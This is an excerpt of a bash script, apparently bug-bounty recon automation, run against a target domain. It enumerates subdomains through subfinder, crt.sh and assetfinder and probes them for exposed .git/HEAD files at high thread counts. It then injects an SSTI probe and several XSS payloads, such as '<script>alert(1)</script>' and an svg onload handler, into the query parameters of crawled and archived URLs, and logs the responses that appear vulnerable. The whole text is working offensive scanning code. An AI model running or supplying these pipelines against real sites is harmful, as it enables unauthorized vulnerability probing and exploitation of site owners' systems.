...
echo
echo
subfinder -d $url -silent -all | httpx-toolkit -silent -sc -t 1000 | anew subfinder;
echo
echo
echo
...
echo
echo
cat subfinder | waybackrobots -d $url -raw | anew wayROBOTS;
echo
echo
echo
...
echo
echo
curl -s "https://crt.sh/?q=$url&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx-toolkit -title -silent | anew crtsh;
echo
echo
echo
...
echo
echo
curl -s "https://crt.sh/?q=$url&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx-toolkit -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew gitHEAD1
echo
echo
echo
...
echo
echo
curl -s "https://crt.sh/?q=$url&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx-toolkit -silent -path /.git/HEAD -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew gitHEAD2;
echo
echo
echo
...
echo
echo
echo $url | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '{{7*7}}' | freq | egrep -v 'Not' | anew ssti2;
echo
echo
echo
...
echo
echo
echo $url | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss1;
echo
echo
echo
...
echo
echo
echo $url | httpx-toolkit -silent | katana -d 10 -silent | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss2;
echo
echo
echo
...
echo
echo
echo $url | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3;
echo
echo
echo
...
echo
echo
gau $url | httpx-toolkit -silent | qsreplace '<script>alert(1)</script>' | freq | egrep -v 'Not' | anew xss4;
echo
echo
echo
